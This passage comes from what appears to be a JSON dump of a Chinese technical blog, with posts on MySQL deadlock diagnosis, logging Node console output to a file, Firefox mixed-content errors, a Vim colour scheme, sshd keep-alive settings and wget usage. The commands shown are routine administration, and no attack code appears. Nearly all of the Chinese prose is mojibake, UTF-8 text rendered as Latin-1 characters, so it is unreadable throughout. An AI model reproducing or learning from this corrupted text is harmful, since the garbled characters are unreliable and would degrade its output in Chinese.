ä¸ä¼šæ„å¤–ï¼Œèƒ½çœ‹åˆ°ä¸‹é¢ä¸¤æ¡è®°å½•ï¼š å¯ä»¥çœ‹åˆ° è¿›ç¨‹idä¸º3175 çš„äº‹åŠ¡åœ¨é”ä½äº†ï¼Œè€Œå¦ä¸€ä¸ªidä¸º3173çš„äº‹åŠ¡æ­£åœ¨æ‰§è¡Œï¼Œä½†æ˜¯æ²¡æœ‰æäº¤äº‹åŠ¡ã€‚ è¿™æ˜¯å› ä¸ºæ‰§è¡Œupdate è¯­å¥ä¹‹åï¼Œmysql ä¼šæ‰§è¡Œç´¢å¼•æ‰«æå¹¶åœ¨è¯¥è¡¨ä¸Šæ–½åŠ ä¸€ä¸ª next-key lock ,å‘å·¦æ‰«æåˆ°20,å‘å³æ‰«æåˆ°39 ,é”å®šåŒºé—´å·¦é—­å³å¼€,æ‰€ä»¥lockçš„èŒƒå›´æ˜¯ [20,39)ã€‚ è§£å†³åŠæ³•æ ¹æ®å®é™…æƒ…å†µçš„ä¸åŒï¼Œæœ‰ä¸åŒçš„æ–¹å¼å¯ä»¥é¿å…æ­»é”ï¼Œè¿™é‡Œä»‹ç»å¸¸ç”¨çš„å‡ ç§ï¼š æ”¹å˜æ•°æ®åº“æ“ä½œé€»è¾‘ï¼Œå°½é‡é¿å…åœ¨ä¸åŒçš„äº‹åŠ¡ä¸­ï¼Œå¯¹åŒä¸€æ¡è®°å½•è¿›è¡Œæ›´æ”¹ã€‚ å¦‚æœä¸åŒç¨‹åºä¼šå¹¶å‘å­˜å–å¤šä¸ªè¡¨ï¼Œå°½é‡çº¦å®šä»¥ç›¸åŒçš„é¡ºåºè®¿é—®è¡¨ï¼Œå¯ä»¥å¤§å¤§é™ä½æ­»é”æœºä¼šã€‚ å‚è€ƒé“¾æ¥ Mysql æ­»é”åŸå› åˆ†æ","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Mysql æŸ¥çœ‹æ­»é”å’Œè§£é™¤æ­»é”","slug":"mysql-view-deadlock-and-release-deadlock","date":"2020-07-19T08:07:48.000Z","updated":"2020-07-19T09:10:18.298Z","comments":true,"path":"mysql-view-deadlock-and-release-deadlock/","link":"","permalink":"https://www.0x2beace.com/mysql-view-deadlock-and-release-deadlock/","excerpt":"å‰æ®µæ—¶é—´é‡åˆ°äº†ä¸€ä¸ªMysql æ­»é”ç›¸å…³çš„é—®é¢˜ï¼Œæ•´ç†ä¸€ä¸‹ã€‚","text":"å‰æ®µæ—¶é—´é‡åˆ°äº†ä¸€ä¸ªMysql æ­»é”ç›¸å…³çš„é—®é¢˜ï¼Œæ•´ç†ä¸€ä¸‹ã€‚ é—®é¢˜æè¿°ï¼šMysql çš„ä¿®æ”¹è¯­å¥ä¼¼ä¹éƒ½æ²¡æœ‰ç”Ÿæ•ˆï¼ŒåŒæ—¶ä½¿ç”¨Mysql GUI å·¥å…·ç¼–è¾‘å­—æ®µçš„å€¼æ—¶ä¼šå¼¹å‡ºå¼‚å¸¸ã€‚ ä»€ä¹ˆæ˜¯æ­»é”åœ¨è§£å†³Mysql æ­»é”çš„é—®é¢˜ä¹‹å‰ï¼Œè¿˜æ˜¯å…ˆæ¥äº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯æ­»é”ã€‚ æ­»é”æ˜¯æŒ‡ä¸¤ä¸ªæˆ–ä¸¤ä¸ªä»¥ä¸Šçš„è¿›ç¨‹åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­,å› äº‰å¤ºèµ„æºè€Œé€ æˆçš„ä¸€ç§äº’ç›¸ç­‰å¾…çš„ç°è±¡,è‹¥æ— å¤–åŠ›ä½œç”¨,å®ƒä»¬éƒ½å°†æ— æ³•æ¨è¿›ä¸‹å».æ­¤æ—¶ç§°ç³»ç»Ÿå¤„äºæ­»é”çŠ¶æ€æˆ–ç³»ç»Ÿäº§ç”Ÿäº†æ­»é”,è¿™äº›æ°¸è¿œåœ¨äº’ç›¸ç­‰çš„è¿›ç¨‹ç§°ä¸ºæ­»é”è¿›ç¨‹ã€‚ æ­»é”çš„è¡¨ç°æ­»é”çš„å…·ä½“è¡¨ç°æœ‰ä¸¤ç§ï¼š Mysql å¢æ”¹è¯­å¥æ— æ³•æ­£å¸¸ç”Ÿæ•ˆ ä½¿ç”¨Mysql GUI å·¥å…·ç¼–è¾‘å­—æ®µçš„å€¼æ—¶ï¼Œä¼šå‡ºç°å¼‚å¸¸ã€‚ å¦‚ä½•é¿å…æ­»é”é˜»æ­¢æ­»é”çš„é€”å¾„å°±æ˜¯é¿å…æ»¡è¶³æ­»é”æ¡ä»¶çš„æƒ…å†µå‘ç”Ÿï¼Œä¸ºæ­¤æˆ‘ä»¬åœ¨å¼€å‘çš„è¿‡ç¨‹ä¸­éœ€è¦éµå¾ªå¦‚ä¸‹åŸåˆ™ï¼š 1.å°½é‡é¿å…å¹¶å‘çš„æ‰§è¡Œæ¶‰åŠåˆ°ä¿®æ”¹æ•°æ®çš„è¯­å¥ã€‚ 2.è¦æ±‚æ¯ä¸€ä¸ªäº‹åŠ¡ä¸€æ¬¡å°±å°†æ‰€æœ‰è¦ä½¿ç”¨åˆ°çš„æ•°æ®å…¨éƒ¨åŠ é”ï¼Œå¦åˆ™å°±ä¸å…è®¸æ‰§è¡Œã€‚ 3.é¢„å…ˆè§„å®šä¸€ä¸ªåŠ é”é¡ºåºï¼Œæ‰€æœ‰çš„äº‹åŠ¡éƒ½å¿…é¡»æŒ‰ç…§è¿™ä¸ªé¡ºåºå¯¹æ•°æ®æ‰§è¡Œå°é”ã€‚å¦‚ä¸åŒçš„è¿‡ç¨‹åœ¨äº‹åŠ¡å†…éƒ¨å¯¹å¯¹è±¡çš„æ›´æ–°æ‰§è¡Œé¡ºåºåº”å°½é‡ä¿è¯ä¸€è‡´ã€‚ æŸ¥çœ‹æ­»é”Mysql æŸ¥è¯¢æ˜¯å¦å­˜åœ¨é”è¡¨æœ‰å¤šç§æ–¹å¼ï¼Œè¿™é‡Œåªä»‹ç»ä¸€ç§æœ€å¸¸ç”¨çš„ã€‚ 1. æŸ¥çœ‹æ­£åœ¨è¿›è¡Œä¸­çš„äº‹åŠ¡1SELECT * FROM information_schema.INNODB_TRX å¯ä»¥çœ‹åˆ° è¿›ç¨‹idä¸º3175 çš„äº‹åŠ¡åœ¨é”ä½äº†ï¼Œè€Œå¦ä¸€ä¸ªidä¸º3173çš„äº‹åŠ¡æ­£åœ¨æ‰§è¡Œï¼Œä½†æ˜¯æ²¡æœ‰æäº¤äº‹åŠ¡ã€‚ 2. æŸ¥çœ‹æ­£åœ¨é”çš„äº‹åŠ¡1SELECT * FROM INFORMATION_SCHEMA.INNODB_LOCKS; 3. æŸ¥çœ‹ç­‰å¾…é”çš„äº‹åŠ¡1SELECT * FROM INFORMATION_SCHEMA.INNODB_LOCK_WAITS; 4. æŸ¥è¯¢æ˜¯å¦é”è¡¨1SHOW OPEN TABLES where In_use &gt; 0; 5. æŸ¥çœ‹æœ€è¿‘æ­»é”çš„æ—¥å¿—1show engine innodb status åœ¨å‘ç”Ÿæ­»é”æ—¶ï¼Œè¿™å‡ ç§æ–¹å¼éƒ½å¯ä»¥æŸ¥è¯¢åˆ°å’Œå½“å‰æ­»é”ç›¸å…³çš„ä¿¡æ¯ã€‚ è§£é™¤æ­»é”å¦‚æœéœ€è¦è§£é™¤æ­»é”ï¼Œæœ‰ä¸€ç§æœ€ç®€å•ç²—æš´çš„æ–¹å¼ï¼Œé‚£å°±æ˜¯æ‰¾åˆ°è¿›ç¨‹idä¹‹åï¼Œç›´æ¥å¹²æ‰ã€‚ æŸ¥çœ‹å½“å‰æ­£åœ¨è¿›è¡Œä¸­çš„è¿›ç¨‹ã€‚ 1234show processlist&#x2F;&#x2F; ä¹Ÿå¯ä»¥ä½¿ç”¨SELECT * FROM information_schema.INNODB_TRX; ä¸Šé¢ä¸¤ä¸ªå‘½ä»¤æ‰¾å‡ºæ¥çš„è¿›ç¨‹id æ˜¯åŒä¸€ä¸ªã€‚ æ€æ‰è¿›ç¨‹å¯¹åº”çš„è¿›ç¨‹ id 1kill id éªŒè¯ï¼ˆkillåå†çœ‹æ˜¯å¦è¿˜æœ‰é”ï¼‰ 1SHOW OPEN TABLES where In_use &gt; 0; å‚è€ƒé“¾æ¥ Mysql æŸ¥çœ‹è¡¨å’Œè§£é”è¡¨ Mysql æ­»é”æ˜¯ä»€ä¹ˆï¼Ÿ","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"å¦‚ä½•æŠŠ Console.log çš„æ ‡å‡†è¾“å‡ºè®°å½•åˆ°æ–‡ä»¶","slug":"how-to-put-console-log-the-standard-output-of-is-recorded-to-a-file","date":"2020-07-18T08:16:51.000Z","updated":"2020-07-18T08:47:27.103Z","comments":true,"path":"how-to-put-console-log-the-standard-output-of-is-recorded-to-a-file/","link":"","permalink":"https://www.0x2beace.com/how-to-put-console-log-the-standard-output-of-is-recorded-to-a-file/","excerpt":"æœ€è¿‘é‡åˆ°äº†è¿™æ ·ä¸€ä¸ªéœ€æ±‚ï¼Œåœ¨ä¸æ”¹åŠ¨ä¹‹å‰çš„ä»»ä½•ä¸€è¡Œä»£ç çš„å‰æä¸‹ï¼Œå¦‚ä½•æŠŠconsole.logçš„æ ‡å‡†è¾“å‡ºå…¨éƒ¨è®°å½•åˆ°æ–‡ä»¶ä¸­å‘¢ï¼Ÿ","text":"æœ€è¿‘é‡åˆ°äº†è¿™æ ·ä¸€ä¸ªéœ€æ±‚ï¼Œåœ¨ä¸æ”¹åŠ¨ä¹‹å‰çš„ä»»ä½•ä¸€è¡Œä»£ç çš„å‰æä¸‹ï¼Œå¦‚ä½•æŠŠconsole.logçš„æ ‡å‡†è¾“å‡ºå…¨éƒ¨è®°å½•åˆ°æ–‡ä»¶ä¸­å‘¢ï¼Ÿ æˆ‘æ˜¯æ²¡æœ‰é€‰æ‹©é‚£äº›å¤§åé¼é¼çš„æ—¥å¿—æ¨¡å—ï¼Œå¦‚ï¼š winston - A logger for just about everything. log4js - A port of log4js to node.js å› ä¸ºæˆ‘çš„éœ€æ±‚å¤Ÿç®€å•ï¼Œåªéœ€è¦èƒ½æŠŠæ—¥å¿—è®°å½•åˆ°æ–‡ä»¶å°±è¡Œï¼Œæ‰€ä»¥ä½¿ç”¨äº†ä¸‹é¢è¿™ç§æœ€ç®€å•çš„æ–¹å¼ï¼š 12345678910111213141516var log_file &#x3D; fs.createWriteStream(path.resolve(__dirname, &quot;.pm2&quot;) + &#39;&#x2F;debug.log&#39;, &#123;flags : &#39;w&#39;&#125;);var log_stdout &#x3D; process.stdout;&#x2F;** * é‡è½½console.log å‡½æ•° *&#x2F;console.log &#x3D; function() &#123; var res &#x3D; &quot;&quot;, len &#x3D; arguments.length; for(var i&#x3D;0; i&lt;len; i++)&#123; res +&#x3D; arguments[i]; &#125; log_file.write(util.format(res) + &#39;\\n&#39;); log_stdout.write(util.format(res) + &#39;\\n&#39;);&#125;; å‚è€ƒé“¾æ¥ Node: log in a file instead of the console","categories":[{"name":"ä¸€äº›ç»éªŒ","slug":"ä¸€äº›ç»éªŒ","permalink":"https://www.0x2beace.com/categories/%E4%B8%80%E4%BA%9B%E7%BB%8F%E9%AA%8C/"}],"tags":[{"name":"Node","slug":"Node","permalink":"https://www.0x2beace.com/tags/Node/"}]},{"title":"è§£å†³Firefox â€œå·²é˜»æ­¢è½½å…¥æ··åˆæ´»åŠ¨å†…å®¹â€","slug":"resolve-firefox-has-blocked-loading-of-mixed-active-content","date":"2020-07-18T07:15:30.000Z","updated":"2020-09-20T15:40:46.029Z","comments":true,"path":"resolve-firefox-has-blocked-loading-of-mixed-active-content/","link":"","permalink":"https://www.0x2beace.com/resolve-firefox-has-blocked-loading-of-mixed-active-content/","excerpt":"æœ€è¿‘éœ€è¦å°†é¡¹ç›®è¿ç§»è‡³ä¸€å°æ–°çš„æœåŠ¡å™¨ï¼Œå…¶ä¸­æ¶‰åŠåˆ°å¤šä¸ªç«™ç‚¹çš„httpä¸httpsä¹‹é—´çš„è½¬æ¢ã€‚ ç½‘ç«™èµ·åˆä¸èƒ½æ­£å¸¸è®¿é—®æ—¶ï¼Œæˆ‘æ²¡åœ¨æ„ï¼Œä»¥ä¸ºæ˜¯ç½‘ç»œå»¶è¿Ÿï¼ˆå› ä¸ºæœåŠ¡å™¨æ”¾åœ¨å›½å¤–ï¼‰ï¼Œç›´åˆ°æˆ‘æ‰“å¼€æ§åˆ¶å°å‘ç°äº†å¦‚ä¸‹å¼‚å¸¸ï¼š","text":"æœ€è¿‘éœ€è¦å°†é¡¹ç›®è¿ç§»è‡³ä¸€å°æ–°çš„æœåŠ¡å™¨ï¼Œå…¶ä¸­æ¶‰åŠåˆ°å¤šä¸ªç«™ç‚¹çš„httpä¸httpsä¹‹é—´çš„è½¬æ¢ã€‚ ç½‘ç«™èµ·åˆä¸èƒ½æ­£å¸¸è®¿é—®æ—¶ï¼Œæˆ‘æ²¡åœ¨æ„ï¼Œä»¥ä¸ºæ˜¯ç½‘ç»œå»¶è¿Ÿï¼ˆå› ä¸ºæœåŠ¡å™¨æ”¾åœ¨å›½å¤–ï¼‰ï¼Œç›´åˆ°æˆ‘æ‰“å¼€æ§åˆ¶å°å‘ç°äº†å¦‚ä¸‹å¼‚å¸¸ï¼š è¿™æ—¶æˆ‘æ‰æ„è¯†åˆ°å¹¶ä¸æ˜¯ç½‘ç»œå»¶è¿Ÿçš„é—®é¢˜ï¼Œè€Œæ˜¯é¡¹ç›®æ²¡æœ‰é…ç½®å¥½ã€‚ ä»€ä¹ˆæ˜¯æ··åˆå†…å®¹ å½“ç”¨æˆ·è®¿é—®ä½¿ç”¨HTTPSçš„é¡µé¢æ—¶ï¼Œä»–ä»¬ä¸webæœåŠ¡å™¨ä¹‹é—´çš„è¿æ¥æ˜¯ä½¿ç”¨SSLåŠ å¯†çš„ï¼Œä»è€Œä¿æŠ¤è¿æ¥ä¸å—å—…æ¢å™¨å’Œä¸­é—´äººæ”»å‡»ã€‚å¦‚æœHTTPSé¡µé¢åŒ…æ‹¬ç”±æ™®é€šæ˜æ–‡HTTPè¿æ¥åŠ å¯†çš„å†…å®¹ï¼Œé‚£ä¹ˆè¿æ¥åªæ˜¯è¢«éƒ¨åˆ†åŠ å¯†ï¼šéåŠ å¯†çš„å†…å®¹å¯ä»¥è¢«å—…æ¢è€…å…¥ä¾µï¼Œå¹¶ä¸”å¯ä»¥è¢«ä¸­é—´äººæ”»å‡»è€…ä¿®æ”¹ï¼Œå› æ­¤è¿æ¥ä¸å†å—åˆ°ä¿æŠ¤ã€‚å½“ä¸€ä¸ªç½‘é¡µå‡ºç°è¿™ç§æƒ…å†µæ—¶ï¼Œå®ƒè¢«ç§°ä¸ºæ··åˆå†…å®¹é¡µé¢ã€‚ â€”â€” MDN é€šä¿—ä¸€ç‚¹è§£é‡Šå°±æ˜¯ï¼šhttps çš„é¡µé¢ä¸­æ··åˆç€http çš„è¯·æ±‚ï¼Œè€Œè¿™ç§è¯·æ±‚ä¸ä¼šè¢«æµè§ˆå™¨æ­£å¸¸æ¥å—çš„ï¼Œä¹Ÿè¢«ç§°ä½œä¸ºæ··åˆå†…å®¹é¡µé¢ã€‚ è§£å†³æ–¹æ¡ˆæ—¢ç„¶å·²ç»æ˜ç™½äº†ä¸ºä»€ä¹ˆä¼šäº§ç”Ÿè¿™ä¸ªé—®é¢˜ï¼Œé‚£ä¹ˆè¦è§£å†³èµ·æ¥ä¹Ÿå°±éå¸¸ç®€å•äº†ã€‚ è®©Firefoxæš‚æ—¶ä¸é˜»æ­¢ æ‰“å¼€æ–°æ ‡ç­¾é¡µï¼Œåœ¨åœ°å€æ è¾“å…¥ about:configï¼Œè¿›å…¥FireFoxé«˜çº§é…ç½®é¡µé¢ã€‚ æœç´¢security.mixed_content.block_active_contentï¼Œå°†é»˜è®¤å€¼trueæ›´æ”¹ä¸ºfalseã€‚ è¿™ç§æ–¹å¼ä»…é€‚ç”¨äºæœ¬åœ°è°ƒè¯•ã€‚ é¿å…åœ¨HTTPSé¡µé¢ä¸­åŒ…å«HTTPçš„å†…å®¹æ›´ç›´æ¥æœ‰æ•ˆçš„æ–¹å¼åº”è¯¥æ˜¯çº¦å®šå¥½é¡¹ç›®ä¸­çš„åè®®ï¼Œç»Ÿä¸€ä½¿ç”¨httpsæˆ–è€…httpã€‚ å‚è€ƒè¿æ¥ ä»€ä¹ˆæ˜¯æ··åˆå†…å®¹â€”â€”MDN httpsè®¿é—®é‡åˆ°â€œå·²é˜»æ­¢è½½å…¥æ··åˆå†…å®¹â€","categories":[{"name":"ä¸€äº›ç»éªŒ","slug":"ä¸€äº›ç»éªŒ","permalink":"https://www.0x2beace.com/categories/%E4%B8%80%E4%BA%9B%E7%BB%8F%E9%AA%8C/"}],"tags":[{"name":"HTTPS","slug":"HTTPS","permalink":"https://www.0x2beace.com/tags/HTTPS/"},{"name":"HTTP","slug":"HTTP","permalink":"https://www.0x2beace.com/tags/HTTP/"}]},{"title":"Vim å®‰è£… molokai é…è‰²æ–¹æ¡ˆ","slug":"vim-install-molokai-color-scheme","date":"2020-07-18T06:36:04.000Z","updated":"2020-07-18T06:38:53.741Z","comments":true,"path":"vim-install-molokai-color-scheme/","link":"","permalink":"https://www.0x2beace.com/vim-install-molokai-color-scheme/","excerpt":"åƒsolarizedã€gruvboxã€ molokaiã€è¿™äº›éƒ½æ˜¯å¤§åé¼é¼çš„VIM é…è‰²æ–¹æ¡ˆï¼Œæœ¬æ–‡åªä»‹ç»å¦‚ä½•å®‰è£… molokai ã€‚","text":"åƒsolarizedã€gruvboxã€ molokaiã€è¿™äº›éƒ½æ˜¯å¤§åé¼é¼çš„VIM é…è‰²æ–¹æ¡ˆï¼Œæœ¬æ–‡åªä»‹ç»å¦‚ä½•å®‰è£… molokai ã€‚ æŒ‰ç…§é¡ºåºæ‰§è¡Œå®Œä¸Šé¢çš„å‘½ä»¤ï¼Œå³å¯ä½¿ç”¨æœ€ç»å…¸çš„é…è‰²æ–¹æ¡ˆäº†ã€‚ 1234567cd ~mkdir .vim &amp;&amp; cd .vimgit clone https:&#x2F;&#x2F;github.com&#x2F;tomasr&#x2F;molokai.gitcp -rf molokai&#x2F;colors&#x2F; .&#x2F;colorsecho colorscheme molokai &gt;&gt; ~&#x2F;.vimrcecho set t_Co&#x3D;256 &gt;&gt; ~&#x2F;.vimrcecho set background&#x3D;dark &gt;&gt; ~&#x2F;.vimrc å®é™…æ•ˆæœï¼š","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Vim","slug":"Vim","permalink":"https://www.0x2beace.com/tags/Vim/"}]},{"title":"sshd_config å¸¸ç”¨é…ç½®é¡¹","slug":"sshd-config-common-configuration-items","date":"2020-07-17T15:17:09.000Z","updated":"2020-07-17T15:18:28.234Z","comments":true,"path":"sshd-config-common-configuration-items/","link":"","permalink":"https://www.0x2beace.com/sshd-config-common-configuration-items/","excerpt":"è¿™ç¯‡ç¬”è®°ç”¨æ¥æ”¶å½•é‚£äº›å¸¸ç”¨çš„sshd_configé…ç½®é¡¹ã€‚","text":"è¿™ç¯‡ç¬”è®°ç”¨æ¥æ”¶å½•é‚£äº›å¸¸ç”¨çš„sshd_configé…ç½®é¡¹ã€‚ ä¿æŒé“¾æ¥ä¿æŒå®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯ä¹‹é—´çš„è¿æ¥ä¿æŒæ´»åŠ¨çŠ¶æ€ä¼¼ä¹æ˜¯æœ€å¸¸è§ç­–ç•¥ã€‚ ServerAliveIntervalï¼šå®¢æˆ·ç«¯åœ¨å‘æœåŠ¡å™¨å‘é€ç©ºæ•°æ®åŒ…ä¹‹å‰ï¼ˆç­‰å¾…è¿æ¥ä¿æŒæ´»åŠ¨çŠ¶æ€ï¼‰å°†ç­‰å¾…çš„ç§’æ•°ã€‚ ClientAliveIntervalï¼šæœåŠ¡å™¨åœ¨å‘å®¢æˆ·ç«¯å‘é€ç©ºæ•°æ®åŒ…ä¹‹å‰ï¼ˆç­‰å¾…è¿æ¥ä¿æŒæ´»åŠ¨çŠ¶æ€ï¼‰å°†ç­‰å¾…çš„ç§’æ•°ã€‚ è®¾ç½®ä¸º0ï¼ˆé»˜è®¤å€¼ï¼‰å°†ç¦ç”¨è¿™äº›åŠŸèƒ½ï¼Œå› æ­¤å¦‚æœç©ºé—²æ—¶é—´å¤ªé•¿ï¼Œè¿æ¥å¯èƒ½ä¼šæ–­å¼€ã€‚ 12345Host myhostshortcut HostName myhost.com User barthelemy ServerAliveInterval 60 ServerAliveCountMax 10 è¿™ä¹ˆè®¾ç½®çš„ä½œç”¨æ˜¯ï¼šå®¢æˆ·ç«¯å°†ç­‰å¾…ç©ºé—²60ç§’é’Ÿï¼ˆServerAliveIntervalæ—¶é—´ï¼‰ï¼Œç„¶åå‘æœåŠ¡å™¨å‘é€ no-op nullæ•°æ®åŒ…ï¼Œå¹¶æœŸå¾…å“åº”ã€‚ å¦‚æœæ²¡æœ‰å“åº”ï¼Œåˆ™å®ƒå°†ç»§ç»­å°è¯•ä¸Šè¿°è¿‡ç¨‹ç›´åˆ°10æ¬¡ï¼ˆServerAliveCountMax æ¬¡æ•° 10 * 60 = 600ç§’ï¼‰ã€‚å¦‚æœæœåŠ¡å™¨ä»ç„¶æ²¡æœ‰å“åº”ï¼Œåˆ™å®¢æˆ·ç«¯å°†æ–­å¼€sshè¿æ¥ã€‚ å‚è€ƒé“¾æ¥ å¦‚ä½•è®©sshå®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯ä¿æŒè¿æ¥ sshd_config å‚è€ƒæ‰‹å†Œ","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"å‘½ä»¤æ•´ç†","slug":"Linux/å‘½ä»¤æ•´ç†","permalink":"https://www.0x2beace.com/categories/Linux/%E5%91%BD%E4%BB%A4%E6%95%B4%E7%90%86/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"ssh","slug":"ssh","permalink":"https://www.0x2beace.com/tags/ssh/"}]},{"title":"Wget ä½¿ç”¨æŠ€å·§","slug":"wget-tips","date":"2020-07-16T15:30:39.000Z","updated":"2020-07-16T15:31:23.790Z","comments":true,"path":"wget-tips/","link":"","permalink":"https://www.0x2beace.com/wget-tips/","excerpt":"wget æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œçš„ä¸‹è½½å·¥å…·ï¼Œå¯¹äºç»å¸¸ä½¿ç”¨Linuxçš„ç”¨æˆ·æ¥è¯´ï¼ŒçœŸæ˜¯å†ç†Ÿæ‚‰ä¸è¿‡äº†ã€‚ä¸‹é¢æ€»ç»“äº†ä¸€äº›å®ç”¨çš„wgetä½¿ç”¨æŠ€å·§ï¼Œå¯èƒ½ä¼šè®©ä½ æ›´åŠ é«˜æ•ˆåœ°ä½¿ç”¨ wgetã€‚","text":"wget æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œçš„ä¸‹è½½å·¥å…·ï¼Œå¯¹äºç»å¸¸ä½¿ç”¨Linuxçš„ç”¨æˆ·æ¥è¯´ï¼ŒçœŸæ˜¯å†ç†Ÿæ‚‰ä¸è¿‡äº†ã€‚ä¸‹é¢æ€»ç»“äº†ä¸€äº›å®ç”¨çš„wgetä½¿ç”¨æŠ€å·§ï¼Œå¯èƒ½ä¼šè®©ä½ æ›´åŠ é«˜æ•ˆåœ°ä½¿ç”¨ wgetã€‚ é‡å‘½åæœ€å¸¸è§çš„ä½¿ç”¨æ–¹å¼ï¼š 1$ wget http:&#x2F;&#x2F;example.com&#x2F;filename.txt wgeté»˜è®¤ä¼šä»¥æœ€åä¸€ä¸ªç¬¦åˆ / çš„åé¢çš„å­—ç¬¦æ¥å¯¹ä¸‹è½½æ–‡ä»¶å‘½åï¼Œå¯¹äºåŠ¨æ€é“¾æ¥çš„ä¸‹è½½é€šå¸¸æ–‡ä»¶åä¼šä¸æ­£ç¡®ã€‚ å¦‚æœå¸Œæœ›å¯¹è¿™ä¸ªä¸‹è½½çš„æ–‡ä»¶è¿›è¡Œé‡å‘½åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å‚æ•° -O æ¥æŒ‡å®šä¸€ä¸ªæ–‡ä»¶åï¼š 1$ wget -O file.zip http:&#x2F;&#x2F;example.com&#x2F;filename.txt åå°ä¸‹è½½å½“éœ€è¦ä¸‹è½½æ¯”è¾ƒå¤§çš„æ–‡ä»¶æ—¶ï¼Œä½¿ç”¨å‚æ•° -b å¯ä»¥éšè—åœ¨åå°è¿›è¡Œä¸‹è½½ï¼š 1$ wget -b http:&#x2F;&#x2F;wppkg.baidupcs.com&#x2F;issue&#x2F;netdisk&#x2F;MACguanjia&#x2F;BaiduNetdisk_mac_3.2.0.9.dmg ç„¶åå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹å½“å‰çš„è¿›åº¦ï¼š 1$ tail -f wget-log ä¸‹è½½ç›®å½•è¿™æ¡å‘½ä»¤å¯ä»¥ä¸‹è½½ http://example.com ç½‘ç«™ä¸Š packages ç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶ã€‚ å‚æ•°è¯´æ˜ï¼š -rï¼šä¸‹è½½ç›®å½• -npï¼šä¸éå†çˆ¶ç›®å½• -ndï¼šä¸åœ¨æœ¬æœºé‡æ–°åˆ›å»ºç›®å½•ç»“æ„ 1$ wget -r -np -nd http:&#x2F;&#x2F;example.com&#x2F;packages&#x2F; ä¸ä¸Šä¸€æ¡å‘½ä»¤ç›¸ä¼¼ï¼Œä½†å¤šåŠ äº†ä¸€ä¸ª --accept=iso é€‰é¡¹ï¼Œè¿™æŒ‡ç¤º wget ä»…ä¸‹è½½ i386 ç›®å½•ä¸­æ‰€æœ‰æ‰©å±•åä¸º iso çš„æ–‡ä»¶ã€‚ä½ ä¹Ÿå¯ä»¥æŒ‡å®šå¤šä¸ªæ‰©å±•åï¼Œåªéœ€ç”¨é€—å·åˆ†éš”å³å¯ã€‚ 1$ wget -r -np -nd --accept&#x3D;iso http:&#x2F;&#x2F;example.com&#x2F;centos-5&#x2F;i386&#x2F; æ‰¹é‡ä¸‹è½½æ­¤å‘½ä»¤å¸¸ç”¨äºæ‰¹é‡ä¸‹è½½çš„æƒ…å½¢ï¼ŒæŠŠæ‰€æœ‰éœ€è¦ä¸‹è½½æ–‡ä»¶çš„åœ°å€æ”¾åˆ° filename.txt ä¸­ï¼Œç„¶å wget å°±ä¼šè‡ªåŠ¨ä¸ºä½ ä¸‹è½½æ‰€æœ‰æ–‡ä»¶äº†ã€‚ 1$ wget -i filename.txt æ–­ç‚¹ç»­ä¼ é€šå¸¸æˆ‘ä»¬åœ¨ä¸‹è½½å¤§æ–‡ä»¶æ—¶ï¼Œä¸ºäº†é˜²æ­¢ä¸­é€”å› ä¸ºç½‘ç»œä¸ç¨³å®šç­‰å› ç´ æ‰€å¼•èµ·çš„ä¸‹è½½å¤±è´¥ï¼Œå¯ä»¥ä½¿ç”¨ -c å‚æ•°ï¼Œä½œä¸ºæ–­ç‚¹ç»­ä¼ ã€‚ å¥½å¤„æ˜¯ï¼šå¦‚æœå½“æ—¶ä¸‹è½½å¤±è´¥äº†ï¼Œä¹‹åå†æ¬¡ä¸‹è½½è¯¥æ–‡ä»¶æ—¶ï¼Œä¼šç»§ç»­ä¸Šä¸€æ¬¡çš„ä¸‹è½½ï¼Œè€Œä¸ç”¨é‡å¤´ä¸‹è½½äº†ã€‚ 1$ wget -c http:&#x2F;&#x2F;example.com&#x2F;really-big-file.iso å…¶ä»–è¯¥å‘½ä»¤å¯ç”¨æ¥é•œåƒä¸€ä¸ªç½‘ç«™ï¼Œwget å°†å¯¹é“¾æ¥è¿›è¡Œè½¬æ¢ã€‚å¦‚æœç½‘ç«™ä¸­çš„å›¾åƒæ˜¯æ”¾åœ¨å¦å¤–çš„ç«™ç‚¹ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨ -H é€‰é¡¹ 1$ wget -m -k (-H) http:&#x2F;&#x2F;www.example.com&#x2F; å‚è€ƒé“¾æ¥ wget ä½¿ç”¨æŠ€å·§","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"å‘½ä»¤æ•´ç†","slug":"Linux/å‘½ä»¤æ•´ç†","permalink":"https://www.0x2beace.com/categories/Linux/%E5%91%BD%E4%BB%A4%E6%95%B4%E7%90%86/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"ä¸€äº›å®ç”¨çš„ Linux å‘½ä»¤","slug":"some-practical-linux-commands","date":"2020-07-16T15:26:13.000Z","updated":"2020-09-05T02:10:46.310Z","comments":true,"path":"some-practical-linux-commands/","link":"","permalink":"https://www.0x2beace.com/some-practical-linux-commands/","excerpt":"è¿™ç¯‡ç¬”è®°çš„ç›®çš„æ˜¯ç”¨æ¥æ•´ç†é‚£äº›ä¸å¸¸ç”¨ä½†åˆå¾ˆå®ç”¨çš„Linux 